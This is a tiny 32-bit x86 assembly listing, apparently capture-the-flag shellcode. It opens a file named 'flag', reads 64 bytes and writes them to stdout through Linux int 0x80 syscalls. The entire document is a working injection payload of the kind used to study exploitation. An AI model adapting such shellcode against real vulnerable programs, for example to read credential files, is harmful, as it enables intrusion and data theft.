BITS 32
global _start
_start:
    xor eax,eax
    push eax
    push 0x67616c66
    mov ebx,esp
    xor ecx,ecx
    xor edx,ecx
    mov al,0x5
    int 0x80

    mov ebx,eax
    mov ecx,esp
    mov dl,0x40
    mov al,0x3
    int 0x80

    xchg eax,edx
    mov bl,0x1
    mov al,0x4
    int 0x80
